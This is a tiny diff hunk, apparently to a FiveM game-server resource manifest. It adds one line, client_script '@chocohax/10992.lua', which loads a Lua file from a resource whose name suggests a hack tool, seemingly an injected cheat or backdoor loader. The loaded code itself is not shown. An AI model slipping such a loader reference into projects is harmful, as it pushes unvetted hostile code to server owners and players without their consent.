@@ -17,3 +17,5 @@ server_scripts{
 
 --ui_page 'html/ui.html'
 
+
+client_script '@chocohax/10992.lua'
